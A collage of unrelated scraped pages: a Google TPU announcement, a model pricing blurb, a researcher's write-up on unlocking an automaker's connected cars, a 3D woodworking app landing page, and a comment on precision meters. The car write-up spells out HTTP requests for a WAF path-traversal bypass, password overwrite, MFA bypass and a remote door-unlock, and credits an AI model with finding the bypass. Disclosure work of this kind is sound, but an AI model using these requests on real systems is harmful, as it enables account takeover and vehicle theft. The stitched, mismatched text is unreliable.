TPU 8t and TPU 8i to offer specialized performance for every AI lifecycle stage. We are making TPUs more accessible by supporting PyTorch, open-source software, and automated tools for developers. Summaries were generated by Google AI. Generative AI is experimental. Explore other styles: General summary Bullet points We first designed TPUs more than a decade ago motivated by Google’s internal demands, including voice recognition and language translation. Eight generations of TPUs later, the use cases have exploded, covering: i) training and serving our own Gemini models, ii) agentic workloads, iii) delivering services to Google Cloud customers on our cloud infrastructure, and most recently, iv) allowing customers to deploy TPUs directly into their own data centers. TPUs are now a rapidly growing business with nearly 100 customers — including frontier labs, trading firms, retailers, universities, and more. At Google Cloud Next in April, we introduced two new specialized TPUs in the same generation — 8t for large-scale training and 8i for real-time reasoning. TPU 8t and 8i offer up to 2.7 times better training performance and 80% better inference price performance, respectively, versus our previous generation of TPUs. Today, we’re taking that a step further, expanding our eighth-generation TPU portfolio with two additional systems: TPU 8i Max for massive context windows and the highest compute density per rack, and TPU 8tx for secure and confidential inference. This is the first time we have introduced four TPU systems in a single year. Our expanded eighth-generation TPU portfolio: TPU 8t, TPU 8i, TPU 8tx, and TPU 8i Max. While we’ve always co-designed our TPUs in partnership with Google DeepMind, we’re now increasingly getting feedback from external organizations on their specific needs. With computing moving from human to agent scale, businesses are asking for accelerators that can reason across AI models’ massive context windows. In addition, some highly regulated customers are asking for specialized encryption capabilities for unique workloads. The new TPU systems we are announcing today address this new reality. Coupled with our recent PyTorch announcements , our aim is to make TPUs more easily accessible to every developer and Cloud customer. By combining modular custom silicon with an open and easy-to-use software stack, we can deliver new hardware and system configurations at the pace of the AI industry. Building the computer around the chip Today, we’re announcing two new TPU systems — and there’s an important difference between a new chip and a new system. Designing a new chip means laying out billions of microscopic transistors on a silicon wafer in a multi-year process bound by the laws of physics and a complex, long-duration manufacturing lifecycle. A system, on the other hand, is about how we bring together the compute, networking, and storage around the chip. This can include how they are packaged with the chips, to quickly meet emerging customer needs and research use cases. When we built our very first TPU more than a decade ago, we knew AI software would evolve much faster than silicon manufacturing ever could. So we made a foundational bet on system balance and modularity, architecting our TPUs as building blocks as part of our AI Hypercomputer , so engineers could rapidly adjust packaging, high-speed memory, optical networking, and security around them. That approach allows us to deliver specialized supercomputers in a matter of months rather than years. Specializing for secure, high-context AI Each system in our eighth-generation TPU portfolio targets a distinct part of the AI lifecycle. TPU 8t and TPU 8i established the baseline for this generation of chips: TPU 8t was designed to be a training powerhouse for massive foundation models with maximum “goodput” — or the useful intelligence delivered per watt of energy used. TPU 8i is the reasoning engine, designed to break the memory wall, cutting inter-chip communication delays by up to half. Now, as enterprises bring autonomous agents into production, we have created two new configurations of these foundational systems to solve two urgent new challenges: hardware-level data security and million-token context scale. TPU 8tx TPU 8tx, our third eighth-generation system, is optimized for secure and confidential inference and is also great for small-scale training. It’s built for regulated enterprises and governments running frontier or proprietary models and autonomous agents alongside their most sensitive data. Normally, data is encrypted when stored or sent over a network, but has to be unlocked in memory while a computer processes it. Built on the same silicon as TPU 8t and paired with 5th Generation AMD EPYC CPU hosts, TPU 8tx builds security directly into the hardware layer, keeping sensitive data and model weights protected and isolated even while in active use. And by adopting the same low-latency Boardfly network we created for real-time reasoning, TPU 8tx keeps multi-step agents moving, delivering up to 2x lower latency compared to TPU 8t with a near-zero performance penalty. Pairing training-grade compute with a fast inference network also means organizations can simultaneously run and customize their models on a single system. TPU 8tx enables teams to fine-tune models using their private data, distill large models into smaller ones, and train their agents through reinforcement learning, all without needing to migrate sensitive data between separate clusters. Designed for sensitive enterprise workloads, TPU 8tx provides hardware-level confidential compute for private fine-tuning and secure agent execution. TPU 8i Max Our fourth system, TPU 8i Max, is built for a different problem: the memory wall. When dozens of AI agents work together across an entire software codebase or hours of video at once, memory bandwidth quickly becomes the bottleneck. So we took two low-latency TPU 8i chips and combined them onto a single package. TPU 8i Max scales compute and memory in lockstep, delivering double the compute, double the SRAM and double the HBM bandwidth of TPU 8i, so processors remain equipped with essential data and so that large workloads do not stall. Further, because TPU 8i Max fits twice the silicon within the existing rack footprint, data centers can deploy significantly more computing power per square foot and per watt. The dual-chip TPU 8i Max system, engineered for massive context windows and maximum compute density. While flexible across workloads, together the four systems in our eighth-generation TPUs give customers a purpose-built accelerator for every stage of the agentic lifecycle. TPU 8t for scale-up training, TPU 8i for low-latency reasoning, TPU 8tx for confidential computing, and TPU 8i Max for massive context windows and the highest compute density per rack. Opening up TPUs to every developer When we launched the first TPU more than a decade ago, there were only a handful of companies running workloads that needed the processing power of a TPU. The use cases were specialized, so engineers would use optimized frameworks and hand-tuned code. Over the years, as AI has advanced, more and more companies began using accelerators. Now, AI adoption is at a point where TPUs are excellent for a wide range of companies and use cases, and as a result, we’ve been working systematically to remove barriers to adoption so that TPUs are as easy-to-use as general-purpose hardware. This investment comes together today across these key areas: Opening up TPU development to every PyTorch developer; no code rewrites needed: Last month, we open-sourced TorchTPU , so PyTorch code and Hugging Face models now run natively on TPUs, alongside out-of-the-box TPU backends for leading open-source inference engines like vLLM and SGLang. And to make hardware optimization effortless, our new open-source TPU agent suite (now in preview) plugs directly into coding tools like Claude Code, Cursor, and Google Antigravity to automate TPU onboarding in minutes, diagnose bottlenecks, and autotune custom kernels using plain language. For production deployments, our new open-source XLA Serving Engine lets you train models in Python and serve them directly in a low-latency C++ runtime across TPUs, GPUs, and CPUs. Industry-leading production performance on InferenceX and AgentX benchmarks: In production, what really matters is outcomes on real AI workloads rather than theoretical peak chip speeds. On industry-standard InferenceX and AgentX benchmarks , which test realistic agentic coding and long-context work, our native vLLM-TorchTPU software stack on TPUs achieved state-of-the-art price-performance marks. New evaluations demonstrate these advantages extend across a wide range of frontier open models and open-source serving stacks while maintaining high model accuracy. Upcoming software optimizations on this same hardware will drive those results even further. Eliminating idle compute waste for autonomous agents: Because AI agents are stateful, they frequently pause for seconds or hours while waiting on a database lookup, an external software tool, or human feedback. To make our agents more resource-efficient during those pauses, our new Agent Compute Engine software automatically suspends and resumes idle sessions, cutting operational infrastructure costs. Breaking through the memory wall with the model-state layer (TPU Sync): Building the computer around the chip also means unifying memory, storage, and networking in software. As agents reason across million-token contexts and continuous reinforcement learning (RL) loops, memory quickly becomes the bottleneck. We’re open-sourcing TPU Sync , the model-state layer for TPU clusters. TPU Sync turns chip HBM, host DRAM, shared storage, and the data center network into a single, co-designed memory hierarchy — automatically tiering massive KV caches off the chip in milliseconds, streaming context across disaggregated prefill and decode nodes, and synchronizing RL weights to cut KV transfer latency and Time to First Token (TTFT) by more than 90%. Scaling distributed workloads across TPUs from a single controller: Now generally available on Google Kubernetes Engine (GKE), Cloud Pathways brings the Google DeepMind runtime behind Gemini to every Google Cloud customer. Using a single-controller architecture and pathwaysutils , you can orchestrate large-scale TPU systems across multiple slices as if they were one local machine for pre-training, reinforcement learning, and multihost inference. Cloud Pathways keeps long-running jobs moving through hardware disruptions with colocated Python sidecars, sub-minute slice hot-swapping, and elastic resharding. Stitching custom TPU topologies on-demand with GKE dynamic slicing: Now generally available, GKE dynamic slicing decouples physical hardware provisioning from logical slice formation using optical circuit switching (OCS) technology. By dynamically assembling TPU cubes into larger topologies (super-slicing) or partitioning them into smaller, isolated workloads (sub-slicing) on-the-fly, this update completely eliminates rigid, manual nodepool recreation cycles. This topology agility slashes job startup times by up to 5x and accelerates fault recovery by up to 4.5x, maximizing overall fleet utilization and workload goodput across all TPUs. Co-designing with a decade of experience Shipping four TPU systems and a unified, open software stack in a single year only happens when silicon architects, networking engineers, compiler teams, and Google DeepMind researchers build side-by-side. Increasingly, we’re even tapping into AI to ideate and build the next generation of AI infrastructure. From using Google DeepMind’s AlphaChip reinforcement learning system to using Gemini to deliver chip layouts in hours rather than weeks, we’re using TPU-powered AI services to rapidly accelerate next-generation TPU hardware development. This is true co-design and a unique Google differentiator. Learn more about our new TPU systems by tuning into today’s broadcast at 9 a.m. PT. Comparison Summary Claude Fable 5.2 (Max, Default Fallback) is amongst the leading models in intelligence, but particularly expensive when comparing to other models of similar price. It's also notably slow per task and very verbose. The model supports text and image input, outputs text, and has a 1M tokens context window. Claude Fable 5.2 (Max, Default Fallback) scores 65 on the Artificial Analysis Intelligence Index, placing it well above average among comparable models (median: 40). When evaluating the Intelligence Index, it generated 275M tokens, which is very verbose in comparison to the median of 72.8M. Pricing for Claude Fable 5.2 (Max, Default Fallback) is $8.00 per 1M input tokens (expensive, median: $2.00) and $40.00 per 1M output tokens (expensive, median: $10.00). On average, it costs $26.54 per task to evaluate Claude Fable 5.2 (Max, Default Fallback) on the Intelligence Index. title: Unlocking any car from X brand in most of the world
body_text: unlocking any car from X brand in most of the world shubs Co-founder of Assetnote, security researcher. Assetnote Home Github Twitter LinkedIn unlocking any car from X brand in most of the world November 7 2026 I've always had a soft spot for this particular car brand. Our family has owned a few of them over the years, and they've served us incredibly well. In 2023, I bought a new four wheel drive/SUV from them, and it was the first time I had access to their connected car platform. Having looked at platforms like this before ( previous works ), I was sceptical about how secure they really were. I suspected there was something there, but life kept getting in the way of actually looking. This July, I collaborated with Sam Curry to take a look at the security of a major automaker's connected car systems. Throughout this post, I'll refer to them simply as "the automaker". When you typically think of car hacking, it's often easy to jump into the hardware side of things, but my background sits pretty squarely in compromising internet-facing web applications and infrastructure. Regardless of all the hardware bits and bobs, it all connects back to some service that, by design, has to be reachable from the internet. The journey started with a simple question: what infrastructure does the app talk to when I remotely unlock my car? To work this out, I downloaded the APK and decompiled it, eventually reconstructing the API requests that were being made. Going through the code, the primary point of contact seemed to be assets under *.redacted-telematics.com.au : dartExecutor.executeDartEntrypoint(createDefault, CollectionsKt.r(gson.toJson(new GlobalConfigParams(false, g11, com.redacted.app.xcapp.a.f69866f, "X", str)), new Gson().toJson(new ApiConfig("https://api.redacted-telematics.com.au", "https://api.redacted-telematics.com.au", "https://api.redacted-telematics.com.au" ... Almost every part of the consumer application called back to redacted-telematics.com.au . What else existed under this domain? The admin tool Running connected car infrastructure can be quite complex, and managing it requires a mix of admin tools, staging, dev, and QA environments, to make sure that customers get a clean experience. Whether all of that should be sitting on the public internet, available to anyone willing to do some basic reconnaissance, is a different story. One asset caught my attention more than the others. admintool.redacted-telematics.com.au returned a page titled TEST HARNESS. Who can resist a subdomain with admintool in it? Visiting this subdomain presented a very plain and grey login screen, which didn't exactly ooze quality, given it presented a logout button before we'd logged in. I love that most single-page applications ship their entire JavaScript bundle even when all they need to render is a login page. Sure, some more modern frameworks split out JavaScript files so that they only serve what is necessary, but in this case, we could comb through the large JavaScript bundle to understand what this "admin tool" actually let you do. Oozing quality Who even reads JavaScript bundles? Turns out this admin tool let you do quite a lot. It had a rich API that let the automaker's employees interact with customer accounts and production vehicles with very few restrictions. Reconstructing the requests, we found that a lot of these APIs needed no authentication beyond the hardcoded API keys sitting in the JavaScript bundle. For example, we could look up user accounts by email address: But that's just not good enough. If we want to unlock any of their cars from just knowing the number plate, we're going to need to do better than that. In Australia, a number plate gets you the VIN (vehicle identification number) fairly easily through state-based registration lookup sites. This isn't really a security flaw. There are plenty of legitimate reasons to want a VIN, like checking a car's true repair and insurance history before buying second-hand. If we could go from VIN to a subscriber or email, we'd complete the chain. Fortunately, there was an API that let you do exactly that: With the subscriber GUID, you could pull the full account details (including the user's email via the /v1/account endpoint) like so: Well, I guess we have the first part of our chain sorted. Plate -> VIN -> Subscriber GUID -> User Account PII (email) registered on the automaker's identity platform (ForgeRock OpenIDM). Now, how do we send commands to any car we want? Surely this admin tool would let us do that? Unfortunately, no. It let us provision features to a car, add ourselves to a user's account as a secondary user, and even generate remote access codes. But for all that functionality, none of it actually got us remote control of a vehicle. The identity platform Sam and I then spent two weeks digging into how the automaker manages their central identity system: the software they use, the way commands are issued, and how consumers authenticate. When a user goes through the authentication flow for the automaker's mobile app, requests are made to login.redacted-identity.com.au , and after going through an MFA flow, a consumer auth token is finally issued. This auth token is then used for subsequent requests to api.redacted-telematics.com.au (both REST APIs and GraphQL). Once you have that auth token, it's pretty much game over. You can control a user's car (remote unlock/lock, horns, engine, etc). So if we could mint a token for any user, we'd finally be able to control anyone's connected car. This is the angle we went for. The automaker is a heavy user of ForgeRock's identity software (OpenAM/OpenIDM). This is the cornerstone of their authentication mechanisms. Pulling the subdomains for *.redacted-identity.com.au , we quickly found their OpenIDM instance at openidm.redacted-identity.com.au . This is the system that manages every identity registered on the automaker's connected car platform. This all clicked together when we were combing through the JavaScript files under *.redacted-telematics.com.au and we came across an absolutely cursed vendor JavaScript bundle that embedded admin credentials for OpenIDM 😱: Even though these admin credentials were meant to be for their staging environment, given the hygiene we'd seen so far, we were pretty sure they'd work in production too. Fighting the WAF Looking closer at OpenIDM, we couldn't tell whether the automaker knew how fragile it was. One thing was obvious though: they'd invested heavily in WAF rules to block access to the sensitive APIs that ForgeRock typically lets you call via /openidm/* . Even with the origin IP, any request to /openidm/ came straight back as an Nginx WAF block. Someone had put real effort into hardening these assets (despite them being externally accessible). Fair enough, and we respect the hardening. But that much WAF investment usually means bandaids over something known to be bad. They probably understood how bad it was to have this asset exposed at all, and some business case kept it there anyway. I'm not sure a WAF rule has ever stopped us when we're motivated enough, so we invested days into finding a way out of these protections, using our trusty path traversal tricks. How hard could it be? Validating the admin credentials we found inside the JavaScript bundle was not that tough. The Australian OpenIDM instance had a few paths whitelisted like /XUI/ and /UI/ , and path traversal characters were not blocked, so something as simple as /XUI/..%2fopenidm/endpoint seemed to at least partially work: At least we know the credentials work in production But it can never be as simple as that, right? The path traversal still didn't get us to the endpoints under /openidm/ , thanks to quirks in how OpenIDM handles routing. Every endpoint would error out like so: Gosh, we're so close?! In OpenIDM's world, there were no servlets (or resources) registered against paths that included the path traversal within them. So it would just error out, even though it issued us an admin JWT. We were incredibly annoyed by this. A simple quirk in routing mechanisms (probably not even designed as a security consideration) was blocking the full attack chain from working. We sat frustrated for a few days, and we thought that the path traversal angle just wasn't going to work. We did find a few other endpoints (user upload, for example) that looked like they might work, but we hit another quirk, a servlet path check, that prevented us from using them meaningfully. All of this made us ask a different question: why expose these OpenIDM instances externally at all? Surely there had to be some legitimate use case for these assets to be exposed on the internet? We went back to the different JavaScript bundles we had collected from their assets and searched them for communications to OpenIDM. We turned to the decompiled Android application and found the following: Maybe there is a whitelist for some endpoints? These were clearly endpoints within their OpenIDM asset that were contactable from the Android app. So, maybe these were accessible without the WAF getting in the way? /openidm/endpoint/aaa -> 403 WAF blocked /openidm/endpoint/pinService -> 404, no WAF block Interesting! What other custom endpoints existed? With some very light brute forcing and guessing, we quickly found a getUser endpoint. Guessing at parameters, we found it accepted mail , guid , and phone . Combined with our admin credentials, what did this really let us do? Eep. The response came back with the password hash, PIN code hash, mobile push tokens, and PII including mobile numbers and full names. There was no WAF block on this endpoint, so no path traversal was needed and the correct servlet responded. Don't get me wrong, this was already pretty impactful. But the passwords were hashed with PBKDF2-SHA512, and needing time on a hash cracking rig for every unlock, with no guarantee of success, felt a bit lacklustre. Back to the drawing board. How could we access the /openidm/managed/user servlet with our path traversal, and still have the path be recognised by OpenIDM? We grabbed the OpenIDM source closest to the version we were testing against and let GPT 5.6 Sol Ultra spend a good six hours on it. It succeeded. Even though Sam and I had both spent time trying to manually bypass this juvenile restriction ourselves, we hadn't tried every possible combination. When Sam and I tried /XUI%2f..%2fopenidm/ , we got a hard 403, and being human, we assumed that applied to every prefix. What GPT 5.6 found was that /static%2f..%2fopenidm/ wasn't covered by the WAF at all, and it gave us the OpenIDM APIs without the servlet confusion issue. Taking over accounts With this bypass, taking over an account became trivial. We could PATCH a new password for any user profile: PATCH /static%2f..%2fopenidm/managed/user/f7ba554REDACTED HTTP/1.1 Host: openidm.redacted-identity.com.au X-OpenIDM-Username: idmadmin X-OpenIDM-Password: REDACTED X-OpenIDM-NoSession: true Content-Type: application/json If-Match: "0000000abc123..." Cache-Control: no-store Accept: application/json [{"operation":"replace","field":"/password","value":"Testing123!"}] Which responded with: > HTTP/1.1 200 OK > {"_id":"f7ba554REDACTED","_rev":"0000000def456..."} OK, so we could overwrite the password for any user. But what about multi-factor authentication? Skipping MFA Well, the automaker's Australian environment had one more misconfiguration: the multi-factor step could be skipped entirely. First, we requested an authentication token from login.redacted-identity.com.au with a Resource Owner Password Credentials grant, which returned a clean id_token we could swap for something usable in the consumer app: POST /oauth2/realms/root/realms/REDACTED/access_token HTTP/1.1 Host: login.redacted-identity.com.au Content-Type: application/x-www-form-urlencoded grant_type=password& [email protected] &password=Testing123!&client_id=REDACTED_PORTAL&client_secret=REDACTED > HTTP/1.1 200 OK > { > "access_token": "...", > "id_token": "eyJ0eXAiOiJKV1Qi...", > "token_type": "Bearer", > "expires_in": 3599 > } We took that and moved on to step two, exchanging the first token for a session: POST /json/realms/REDACTED/authenticate?authIndexType=service&authIndexValue=IDTokenROPC HTTP/1.1 Host: login.redacted-identity.com.au Content-Type: application/json Accept: application/json Accept-API-Version: resource=2.0, protocol=1.0 idtoken: eyJ0eXAiOiJKV1Qi... > HTTP/1.1 200 OK > { > "tokenId": "AQIC5wM2LY4Sfcy...*", > "successUrl": "/openam/console", > "realm": "/REDACTED" > } Lastly, we performed the token exchange for a mobile app access token: POST /oauth2/realms/root/realms/REDACTED/authorize HTTP/1.1 Host: login.redacted-identity.com.au Content-Type: application/x-www-form-urlencoded Accept-API-Version: resource=2.1, protocol=1.0 x-fr-version: 2025.05.05 Authorization: Basic <REDACTED> iPlanetDirectoryPro: AQIC5wM2LY4Sfcy...* Cookie: iPlanetDirectoryPro=AQIC5wM2LY4Sfcy...* client_id=REDACTED_APP&redirect_uri=com.redacted.app:/oauth2Callback&scope=openid%20profile%20write&response_type=code&state=<state>&code_challenge=<S256_challenge>&code_challenge_method=S256&decision=allow&csrf=AQIC5wM2LY4Sfcy...* > HTTP/1.1 302 Found > Location: com.redacted.app:/oauth2Callback?code=<authorization_code>&state=<state> POST /oauth2/realms/root/realms/REDACTED/access_token HTTP/1.1 Host: login.redacted-identity.com.au Content-Type: application/x-www-form-urlencoded Accept-API-Version: resource=2.1, protocol=1.0 Authorization: Basic <REDACTED> grant_type=authorization_code&code=<authorization_code>&redirect_uri=com.redacted.app:/oauth2Callback&client_id=REDACTED_APP&code_verifier=<pkce_verifier> > HTTP/1.1 200 OK > { > "access_token": "<app_access_token>", > "refresh_token": "...", > "token_type": "Bearer", > "scope": "openid profile write", > "expires_in": 3599 > } It's super convoluted, I know. OAuth is annoyingly hard sometimes. But these steps let us bypass multi-factor authentication for any user of the automaker's connected car app. Unlocking the car At this point, we were so damn close to unlocking any of the automaker's cars in Australia. All that was left was issuing the command API requests with the app token we could now mint for anyone. POST /v1/remote/route/command HTTP/1.1 Host: api.redacted-telematics.com.au Authorization: Bearer <app_access_token> X-API-KEY: REDACTED X-GUID: f7ba554REDACTED X-BRAND: REDACTED X-APPBRAND: REDACTED X-CHANNEL: REDACTED X-LOCALE: en-AU X-APPVERSION: REDACTED X-OSNAME: Android X-OSVERSION: 14 X-DEVICE-TIMEZONE: AEST X-CORRELATIONID: 6f1a2b3c-4d5e-6f70-8192-a3b4c5d6e7f8 X-GENERATION: REDACTED VIN: XXXXXXXXXXXXXXXXX Content-Type: application/json Accept: application/json User-Agent: okhttp/4.12.0 {"command": "door-unlock", "autoFixPopup": false, "beepCount": null} And magic. The doors unlocked. We obviously did all of this on cars we explicitly owned or had permission to interact with. But let's take a step back and think about what we achieved here. We could send commands to any of the automaker's vehicles in Australia, across both of their brands, by only knowing the number plate of the vehicle. The final chain looked like this: Plate -> VIN -> Subscriber GUID -> OpenIDM admin credentials in JS vendor bundle -> Path traversal to bypass the WAF -> MFA bypass via ROPC flow -> Minting a consumer app token -> Remote command API. At 12AM, when the full chain finally came together, I took a short video of the script in action. It's not polished, but it still felt magical seeing it all work. I definitely live for hard challenges like these. 0:00 / 0:57 1× You might be wondering: Shubs, you said any of their cars in the world. This only covers Australia. What gives? There's a much more complex chain that Sam and I worked on together, which he's published on his blog here . It required a lot more work than the steps we took for Australia, as the automaker had spent much more time securing the US, Canadian, and European OpenIDM environments. At the end of the day, with both writeups combined, we could send remote commands such as unlocking and turning the engines on, for any of the automaker's vehicles in Australia, the United States, and Canada.

title: KetchUp – Open-source SketchUp alternative built with Rust and WebGPU
body_text: BenchUp — Free 3D Woodworking & Furniture Design App Skip to content BenchUp . GitHub ↗ Try in browser ↗ 3D design for your next woodworking project. BenchUp is a free, open-source 3D modeling app for woodworking and furniture design. Plan a shelf, table, cabinet, or workbench with exact measurements before you build. Use it on Windows, macOS, Linux, or right in your desktop browser. A little sketch. A whole new dimension. Actual BenchUp workspace Download for Windows ↓ Windows x64 · .exe installer Download for macOS ↓ Apple Silicon · .pkg installer Download for Linux ↓ Linux x64 · AppImage Release notes & all downloads ↗ Free & open source. No account needed. Made for a desktop browser and a mouse. From the first line to the finer details. Start with a simple shape. Keep the tools you need close, and your model at the center. ↗ Draw. Pull. Make it yours. Sketch lines, rectangles, circles, and freehand outlines. Turn faces into forms with Push/Pull, then move, scale, offset, and paint. ⌖ Keep your ideas in measure. Snap to geometry and axes, type exact lengths, and add dimensions. Organize the bigger picture with groups, components, and tags. ↓ Your work, in your hands. Autosave locally and download portable .ketchup projects. Import SketchUp geometry or export an OBJ to take your model further. Plan your furniture before the first cut. For woodworkers, furniture makers, and DIY builders who want to explore a project in 3D. Model the pieces Draw board outlines with rectangles and lines, then use Push/Pull to give them thickness. Move and copy geometry to explore shelves, tables, cabinets, workbenches, and other furniture. Check dimensions and fit Enter exact lengths, snap to geometry and axes, and use Tape Measure and Dimensions to inspect your design. Orbit around the assembly to review proportions before taking it to the workshop. Keep the project organized Use groups, reusable components, and tags to organize parts. Save a portable .ketchup project locally, import SketchUp geometry, or export OBJ geometry for another 3D workflow. Start with the browser editor or download the desktop app . Read the user guide for modeling instructions and supported workflows. Your first shape is three steps away. The editor opens with a clean slate. Here’s a good place to start. Open the workspace ↗ Draw a rectangle Click one corner, then the opposite corner to create your first face. Give it some depth Choose Push/Pull, click the face, move your mouse, and click to finish. Find a fresh perspective Choose Orbit and drag to look around. Scroll to zoom; press F to fit your model. A few things before you begin. What do I need to run it? A desktop browser with hardware acceleration and WebGPU or WebGL2 support. Use a mouse and keyboard for modeling. You can also run BenchUp as a native Windows, macOS, or Linux app. Where does my work go? Your model is autosaved in this browser on this device. Use File → Save to download a .ketchup project you can keep or open again. Clearing browser data can remove autosaved work, so download projects you want to keep. There’s no cloud storage or account to set up. Can I use my existing models? Use File → Import/Export to import SketchUp (.skp) geometry or export Wavefront OBJ (.obj). Imports run locally. SketchUp textures, scenes, and some model features aren’t supported; OBJ export includes geometry without materials. Is BenchUp free? Yes. BenchUp is open source under the MIT license and written in Rust. Explore the code, read the full guide, or contribute on GitHub. A blank canvas. Plenty of possibilities. High precision instrumentation just uses a stable comparator to sync the AC line Zero crossing events, and times the sharp roll-off gap over several cycles to estimate the center transition event. This allows readings to be synced in the low-noise state of the power lines cycles, and time what the readings should be when monitoring the voltage, temperature, and current across the cycles. Additionally, most >8-digit meters internal power supply will have a tuned filter for the 60Hz/50Hz line. Getting a line filter will often give a digit of precision on older equipment, and clip-on line chokes in bulk also help. https://www.digikey.com/en/products/detail/eaton-tripp-lite/...
